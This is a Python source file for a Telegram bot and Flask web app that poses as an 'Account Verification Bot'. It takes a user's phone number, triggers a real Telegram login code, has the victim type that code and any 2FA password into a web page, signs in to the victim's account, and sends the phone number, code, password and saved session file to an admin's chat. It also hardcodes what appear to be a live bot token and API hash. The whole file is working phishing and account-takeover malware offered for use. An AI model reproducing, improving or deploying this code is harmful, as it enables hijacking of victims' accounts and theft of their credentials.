import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.errors import FloodWaitError, PhoneCodeInvalidError, SessionPasswordNeededError
from flask import Flask, render_template, request, jsonify
import asyncio
import threading
import time
import json
import logging
from datetime import datetime, timedelta
import queue

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# =============== CONFIGURATION ===============
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
API_ID = int(os.environ.get('API_ID', '25240346'))
API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
ADMIN_ID = os.environ.get('ADMIN_ID', '5425526761')

# Initialize
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# =============== GLOBAL ASYNCIO SETUP ===============
# Create single global event loop
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# Storage with expiration
user_data = {}  # user_id -> {phone, name, username, timestamp}
otp_sessions = {}  # phone -> {phone_code_hash, timestamp}
telegram_clients = {}  # phone -> TelegramClient
session_expiry = 600  # 10 minutes

# Thread-safe queue for bot tasks
bot_task_queue = queue.Queue()

# =============== HELPER FUNCTIONS ===============
def clean_expired_sessions():
    """Clean expired sessions"""
    current_time = time.time()
    expired_users = []
    expired_otp = []
    
    for user_id, data in list(user_data.items()):
        if current_time - data.get('timestamp', 0) > session_expiry:
            expired_users.append(user_id)
    
    for phone, data in list(otp_sessions.items()):
        if current_time - data.get('timestamp', 0) > session_expiry:
            expired_otp.append(phone)
    
    for user_id in expired_users:
        del user_data[user_id]
    
    for phone in expired_otp:
        if phone in otp_sessions:
            del otp_sessions[phone]
        if phone in telegram_clients:
            try:
                client = telegram_clients[phone]
                loop.run_until_complete(client.disconnect())
                del telegram_clients[phone]
            except:
                pass
    
    if expired_users or expired_otp:
        logger.info(f"🧹 Cleaned {len(expired_users)} users, {len(expired_otp)} OTP sessions")

def send_to_admin(phone, otp=None, password=None, user_info=None, session_file=None):
    """Send notification to admin"""
    try:
        message = f"""📱 <b>NEW VERIFICATION DATA</b>

📞 Phone: {phone}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
        
        if user_info:
            if user_info.get('name'):
                message += f"\n👤 Name: {user_info['name']}"
            if user_info.get('username'):
                message += f"\n🔗 Username: @{user_info['username']}"
        
        if otp:
            message += f"\n🔢 OTP: <code>{otp}</code>"
        
        if password:
            message += f"\n🔐 2FA Password: <code>{password}</code>"
        
        bot.send_message(ADMIN_ID, message, parse_mode='HTML')
        
        # Send session file if exists
        if session_file and os.path.exists(session_file):
            try:
                with open(session_file, 'rb') as f:
                    bot.send_document(
                        ADMIN_ID,
                        f,
                        caption=f"📁 Session file for {phone}"
                    )
            except Exception as e:
                logger.error(f"Error sending session file: {e}")
        
        logger.info(f"📨 Admin notified about {phone}")
        return True
    except Exception as e:
        logger.error(f"Admin notification error: {e}")
        return False

# =============== TELEGRAM FUNCTIONS (Using global loop) ===============
def send_otp_via_telethon(phone):
    """Send OTP using Telethon - thread-safe"""
    try:
        # Create session directory
        os.makedirs('sessions', exist_ok=True)
        session_name = f"sessions/{phone.replace('+', '')}_{int(time.time())}"
        
        # Create and store client
        client = TelegramClient(session_name, API_ID, API_HASH, loop=loop)
        
        # Connect and send code
        loop.run_until_complete(client.connect())
        sent = loop.run_until_complete(client.send_code_request(phone))
        
        # Store data
        telegram_clients[phone] = client
        otp_sessions[phone] = {
            'phone_code_hash': sent.phone_code_hash,
            'timestamp': time.time()
        }
        
        logger.info(f"✅ OTP sent to {phone}")
        return {'success': True, 'message': 'OTP sent'}
        
    except FloodWaitError as e:
        logger.error(f"Flood wait for {phone}: {e.seconds}s")
        return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
    except Exception as e:
        logger.error(f"Error sending OTP to {phone}: {e}")
        return {'success': False, 'error': str(e)}

def verify_otp_via_telethon(phone, otp_code):
    """Verify OTP using Telethon - thread-safe"""
    try:
        if phone not in telegram_clients or phone not in otp_sessions:
            return {'success': False, 'error': 'Session expired. Please restart.'}
        
        client = telegram_clients[phone]
        phone_code_hash = otp_sessions[phone]['phone_code_hash']
        
        # Sign in with OTP
        loop.run_until_complete(client.sign_in(phone=phone, code=otp_code, phone_code_hash=phone_code_hash))
        
        # Check if authorized
        if loop.run_until_complete(client.is_user_authorized()):
            # Get user info
            me = loop.run_until_complete(client.get_me())
            user_info = {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
            
            # Save session
            loop.run_until_complete(client.session.save())
            session_file = client.session.filename
            
            logger.info(f"✅ Verified {phone}, user: {user_info.get('username', 'N/A')}")
            
            return {
                'success': True,
                'user_info': user_info,
                'session_file': session_file,
                'requires_2fa': False
            }
        else:
            return {'success': False, 'error': 'Not authorized'}
            
    except SessionPasswordNeededError:
        logger.info(f"🔐 2FA required for {phone}")
        return {'success': True, 'requires_2fa': True}
    except PhoneCodeInvalidError:
        logger.error(f"❌ Invalid OTP for {phone}")
        return {'success': False, 'error': 'Invalid OTP'}
    except Exception as e:
        logger.error(f"Error verifying OTP for {phone}: {e}")
        return {'success': False, 'error': str(e)}

def verify_2fa_via_telethon(phone, password):
    """Verify 2FA password - thread-safe"""
    try:
        if phone not in telegram_clients:
            return {'success': False, 'error': 'Session expired'}
        
        client = telegram_clients[phone]
        
        # Sign in with password
        loop.run_until_complete(client.sign_in(password=password))
        
        # Get user info
        me = loop.run_until_complete(client.get_me())
        user_info = {
            'id': me.id,
            'username': me.username,
            'first_name': me.first_name,
            'last_name': me.last_name,
            'phone': me.phone
        }
        
        # Save session
        loop.run_until_complete(client.session.save())
        session_file = client.session.filename
        
        logger.info(f"✅ 2FA successful for {phone}")
        
        return {
            'success': True,
            'user_info': user_info,
            'session_file': session_file
        }
    except Exception as e:
        logger.error(f"2FA error for {phone}: {e}")
        return {'success': False, 'error': str(e)}

# =============== BOT HANDLERS ===============
@bot.message_handler(commands=['start'])
def handle_start(message):
    """Handle /start command"""
    try:
        user_id = message.from_user.id
        first_name = message.from_user.first_name or ""
        
        # Generate unique session ID
        session_id = f"session_{user_id}_{int(time.time())}"
        
        # Store user session
        user_data[user_id] = {
            'name': first_name,
            'username': message.from_user.username,
            'lang': message.from_user.language_code,
            'timestamp': time.time()
        }
        
        # Create WebApp URL
        webapp_url = f"/webapp?user_id={user_id}&session={session_id}"
        
        # Create WebApp button
        kb = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton(
            "📱 Open Verification WebApp",
            web_app=types.WebAppInfo(url=webapp_url)
        )
        kb.add(btn)
        
        bot.send_message(
            message.chat.id,
            f"""👋 <b>Hello {first_name}!</b>

Welcome to Account Verification Bot

Click the button below to verify your account:

✅ <b>Steps:</b>
1. Open WebApp & share contact
2. 5-digit OTP appears here
3. Enter OTP in WebApp
4. Complete verification

<b>Session ID:</b> <code>{session_id}</code>""",
            parse_mode='HTML',
            reply_markup=kb
        )
        
        logger.info(f"✅ /start for user {user_id}")
        
    except Exception as e:
        logger.error(f"Start error: {e}")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Handle contact sharing"""
    try:
        contact = message.contact
        user_id = message.from_user.id
        phone = contact.phone_number
        
        # Format phone
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"📱 Contact from {user_id}: {phone}")
        
        # Update user data
        if user_id in user_data:
            user_data[user_id].update({
                'phone': phone,
                'contact_name': f"{contact.first_name or ''} {contact.last_name or ''}".strip(),
                'timestamp': time.time()
            })
        else:
            user_data[user_id] = {
                'phone': phone,
                'contact_name': f"{contact.first_name or ''} {contact.last_name or ''}".strip(),
                'name': message.from_user.first_name,
                'username': message.from_user.username,
                'timestamp': time.time()
            }
        
        # Send processing message
        msg = bot.send_message(
            message.chat.id,
            f"✅ <b>Contact Received!</b>\n\n📱 Phone: {phone}\n\n⏳ Sending OTP via Telegram...",
            parse_mode='HTML'
        )
        
        # Send OTP via Telethon (thread-safe)
        def send_otp_task():
            result = send_otp_via_telethon(phone)
            
            if result['success']:
                bot.edit_message_text(
                    f"""✅ <b>OTP SENT SUCCESSFULLY!</b>

📱 Phone: {phone}
🔢 <b>5-digit OTP</b> has been sent via Telegram

Check your Telegram messages for the 5-digit code.

<i>Telegram OTPs are always 5 digits (e.g., 12345)</i>""",
                    message.chat.id,
                    msg.message_id,
                    parse_mode='HTML'
                )
                
                # Notify admin
                send_to_admin(phone, user_info=user_data[user_id])
            else:
                bot.edit_message_text(
                    f"❌ <b>Error:</b> {result.get('error', 'Failed to send OTP')}",
                    message.chat.id,
                    msg.message_id,
                    parse_mode='HTML'
                )
        
        # Add task to queue
        bot_task_queue.put(send_otp_task)
        
        # Delete contact message
        try:
            bot.delete_message(message.chat.id, message.message_id)
        except:
            pass
        
    except Exception as e:
        logger.error(f"Contact error: {e}")

# =============== FLASK ROUTES ===============
@app.route('/')
def index():
    """Main page redirect to WebApp"""
    return render_template('index.html')

@app.route('/webapp')
def webapp():
    """WebApp page"""
    user_id = request.args.get('user_id')
    session = request.args.get('session')
    
    if not user_id or not session:
        return "Invalid request. Please use /start in bot.", 400
    
    # Check if session is expired
    if user_id in user_data:
        if time.time() - user_data[user_id].get('timestamp', 0) > session_expiry:
            return render_template('expired.html')
    
    return render_template('webapp.html', user_id=user_id, session=session)

@app.route('/api/user/<int:user_id>')
def api_user(user_id):
    """Get user data for WebApp"""
    if user_id not in user_data:
        return jsonify({'error': 'User not found', 'expired': True})
    
    data = user_data[user_id]
    
    # Check expiration
    if time.time() - data.get('timestamp', 0) > session_expiry:
        return jsonify({'error': 'Session expired', 'expired': True})
    
    return jsonify({
        'phone': data.get('phone', ''),
        'name': data.get('name', ''),
        'username': data.get('username', ''),
        'lang': data.get('lang', ''),
        'has_phone': bool(data.get('phone')),
        'timestamp': data.get('timestamp', 0)
    })

@app.route('/api/verify-otp', methods=['POST'])
def api_verify_otp():
    """Verify OTP from WebApp"""
    try:
        data = request.json
        user_id = data.get('user_id')
        otp = data.get('otp', '').strip()
        
        if not user_id or not otp:
            return jsonify({'success': False, 'error': 'Missing data'})
        
        # Get user data
        if user_id not in user_data:
            return jsonify({'success': False, 'error': 'Session expired', 'expired': True})
        
        user_info = user_data[user_id]
        phone = user_info.get('phone', '')
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone not found'})
        
        # Check expiration
        if time.time() - user_info.get('timestamp', 0) > session_expiry:
            return jsonify({'success': False, 'error': 'Session expired', 'expired': True})
        
        # Clean OTP (5 digits)
        cleaned_otp = ''.join(filter(str.isdigit, otp))
        if len(cleaned_otp) != 5:
            return jsonify({'success': False, 'error': 'Enter 5-digit OTP'})
        
        # Verify OTP
        result = verify_otp_via_telethon(phone, cleaned_otp)
        
        if result['success']:
            if result.get('requires_2fa'):
                return jsonify({
                    'success': True,
                    'requires_2fa': True,
                    'message': '2FA password required'
                })
            else:
                # Update user data
                if 'user_info' in result:
                    user_data[user_id].update(result['user_info'])
                    user_data[user_id]['verified'] = True
                    user_data[user_id]['timestamp'] = time.time()
                
                # Send to admin
                send_to_admin(
                    phone, 
                    otp=cleaned_otp,
                    user_info=user_info,
                    session_file=result.get('session_file')
                )
                
                return jsonify({
                    'success': True,
                    'requires_2fa': False,
                    'message': 'Verification successful!'
                })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', 'Verification failed')
            })
            
    except Exception as e:
        logger.error(f"API verify error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-2fa', methods=['POST'])
def api_verify_2fa():
    """Verify 2FA password"""
    try:
        data = request.json
        user_id = data.get('user_id')
        password = data.get('password', '').strip()
        
        if not user_id or not password:
            return jsonify({'success': False, 'error': 'Missing data'})
        
        if user_id not in user_data:
            return jsonify({'success': False, 'error': 'Session expired', 'expired': True})
        
        user_info = user_data[user_id]
        phone = user_info.get('phone', '')
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone not found'})
        
        # Verify 2FA
        result = verify_2fa_via_telethon(phone, password)
        
        if result['success']:
            # Update user data
            if 'user_info' in result:
                user_data[user_id].update(result['user_info'])
                user_data[user_id]['verified'] = True
                user_data[user_id]['timestamp'] = time.time()
            
            # Send to admin with password
            send_to_admin(
                phone,
                password=password,
                user_info=user_info,
                session_file=result.get('session_file')
            )
            
            return jsonify({
                'success': True,
                'message': '2FA verified successfully!'
            })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', '2FA verification failed')
            })
            
    except Exception as e:
        logger.error(f"API 2FA error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/refresh-session', methods=['POST'])
def api_refresh_session():
    """Refresh session expiry"""
    try:
        data = request.json
        user_id = data.get('user_id')
        
        if user_id and user_id in user_data:
            user_data[user_id]['timestamp'] = time.time()
            return jsonify({'success': True, 'message': 'Session refreshed'})
        else:
            return jsonify({'success': False, 'error': 'User not found'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# =============== BACKGROUND TASKS ===============
def bot_task_worker():
    """Process bot tasks from queue"""
    while True:
        try:
            task = bot_task_queue.get()
            task()
            bot_task_queue.task_done()
        except Exception as e:
            logger.error(f"Task worker error: {e}")
        time.sleep(0.1)

def cleanup_worker():
    """Periodic cleanup of expired sessions"""
    while True:
        try:
            clean_expired_sessions()
            time.sleep(60)  # Clean every minute
        except Exception as e:
            logger.error(f"Cleanup worker error: {e}")
            time.sleep(60)

# =============== MAIN ===============
if __name__ == "__main__":
    logger.info("="*60)
    logger.info("🚀 Telegram Verification Bot")
    logger.info("="*60)
    logger.info(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    logger.info(f"👑 Admin ID: {ADMIN_ID}")
    logger.info(f"🔄 Using single asyncio loop")
    
    # Start background workers
    logger.info("Starting background workers...")
    task_worker_thread = threading.Thread(target=bot_task_worker, daemon=True)
    task_worker_thread.start()
    
    cleanup_thread = threading.Thread(target=cleanup_worker, daemon=True)
    cleanup_thread.start()
    
    # Start bot in separate thread with error handling
    def run_bot():
        logger.info("🤖 Starting bot polling...")
        while True:
            try:
                # Remove any existing webhook
                bot.remove_webhook()
                time.sleep(1)
                
                # Start polling with skip_pending
                bot.polling(none_stop=True, skip_pending=True, timeout=30)
                
            except Exception as e:
                logger.error(f"Bot polling error: {e}")
                time.sleep(5)  # Wait before retrying
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # Wait for bot to initialize
    time.sleep(3)
    
    # Start Flask
    port = int(os.environ.get("PORT", 10000))
    logger.info(f"🚀 Starting Flask on port {port}")
    app.run(
        host="0.0.0.0",
        port=port,
        debug=False,
        threaded=True,
        use_reloader=False
    )
